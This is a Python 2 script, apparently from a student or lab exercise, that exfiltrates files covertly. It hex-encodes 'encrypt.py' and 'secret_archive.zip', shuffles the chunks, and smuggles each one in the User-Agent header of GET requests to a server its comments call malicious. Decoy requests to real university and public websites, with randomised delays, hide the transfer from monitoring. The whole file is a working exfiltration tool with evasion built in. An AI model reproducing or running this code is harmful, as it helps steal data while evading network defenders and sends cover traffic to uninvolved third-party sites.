#!/usr/bin/env python
# -*- coding: utf-8 -*-


# To forge HTTP requests
import httplib
# To convert a file to its hexadecimal representation
import binascii

import random
import time


#################################################################

def convert_file_to_hex_string(filename):
	"""
	Converts a file into its hexadecimal representation.
	param str filename:	name and path of the file to convert

	return str:		hex representation of the file
	"""
    
	bin_str = ""
    	
	with open(filename, "rb") as f:
        	bin_str = f.read()
    	
	hex_str = binascii.hexlify(bin_str)
	
	return hex_str


def hex_to_list_pos_data(hex_str):
	"""
	Takes an hexadecimal representation (of a file in our case), cuts it in small chunks (4 characters at a time) and arrange them in a random order. The output is a list of the position of the chunk in the original string and the chunk value.
	:param str hex_str:		hex representation of a file (see convert_file_to_hex_string)

	:return list[list[int,str]]:	list of position and chuncks value
	"""
    
	n = 4
    	list_pos_data = [[i//n, hex_str[i:i+n]] for i in range(0, len(hex_str), n)]
	random.shuffle(list_pos_data)
    
	return list_pos_data


########################################################

def create_random_request():
	"""
	Generate between 0 to 5 HTTP random requests to four different websites (in our case to simulate HTTP traffic = noise to mask our malicious requests.
	"""

	list_websites = ["www.vorlesungsverzeichnis.ethz.ch", "www.unil.ch", "www.google.com", "www.stackoverflow.com"]
	list_ressources = [["Vorlesungsverzeichnis/", "Vorlesungsverzeichnis/sucheDozierendePre.view?lang=en", "Vorlesungsverzeichnis/sucheLehrveranstaltungenPre.view?lang=en"],["index.html", "actu/home.html", "central/home/menuinst/formations.html", "central/home/menuinst/organisation.html", "central/home/menuinst/recherche.html", "central/home/menuinst/recherche/publications.html"],["index.html", "search?q=do+a+barrel+roll", "search?q=eth", "search?q=google", "search?q=search"],["questions/53741270/chessboard-in-pure-js", "questions/53739656/scala-generic-tuple", "questions/tagged/python", "questions/53746145/how-to-save-session-on-whatsap"]]

	index_server = random.randint(0,3)
	server = list_websites[index_server]

	user_agent = "Mozilla/5.0 (X11; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0"
	headers = {'User-Agent': user_agent, 'Accept': "*/*", 'accept-language': "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3"}

	conn = httplib.HTTPConnection(server)
	
	num_requests = random.randint(0,5)
	for i in range(num_requests):
		ressource = "/" + random.choice(list_ressources[index_server])
		print ressource
		conn.request("GET", ressource, "", headers)
		conn.close()


def send_get_requests_with_data(server, ressource, list_pos_data, request_type):
	"""
	Function that sends the malicious requests to the malicious server in the middle of some random traffic (noise). 
	
	param str server:		ip or dns name of the malicious server
	param str ressource		ressource to access (example: '/index.html') on the malicious server.
	param list list_pos_data:	list of (data positions, data chunk) to send.
	param str request_type: 	"algo" or "data" : to differentiate which data type is sent (if it is the encryption algorithm or the actual data)

	return list:			result of each request [status, reason, output], mostly for test and debug
	"""
	
	conn = httplib.HTTPConnection(server)
	
	results = []

	for i in range(0, len(list_pos_data)):
		
		time.sleep(random.random())

		create_random_request()		

		user_agent = "Mozilla/5.0 (X11; Linux i686; rv:63.0) Gecko/" + str(list_pos_data[i][1]) + " Firefox/63.0"
		headers = {'User-Agent': user_agent, 'Accept': "*/*", 'accept-language': "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3"}
		ressource_fake = ressource + "?pos=" + str(list_pos_data[i][0]) + "&type=" + request_type
		conn.request("GET", ressource_fake, "", headers)
		
		# JUST FOR TEST, TO GET FEEDBACK
		res = conn.getresponse()
		output = res.read()
		results = results + [res.status, res.reason, output]

	return results



if __name__ == "__main__":

	# SERVER TO SEND DATA TO (malicious server)
	server = "john-server"
	ressource = "/index.html"
	
	# SEND THE ENCRYPTION ALGORITHM

	algo_file = "encrypt.py"
	
	algo_hex_str = convert_file_to_hex_string(algo_file)
	algo_list_pos_data = hex_to_list_pos_data(algo_hex_str)
	
	results_algo = send_get_requests_with_data(server, ressource, algo_list_pos_data, "algo")

	# SEND THE ACTUAL FILE (WITH ENCRYPTED CONTENT)

	data_file = "secret_archive.zip"
	
	data_hex_str = convert_file_to_hex_string(data_file)
	list_pos_data = hex_to_list_pos_data(data_hex_str)

	results_data = send_get_requests_with_data(server, ressource, list_pos_data, "data")
	



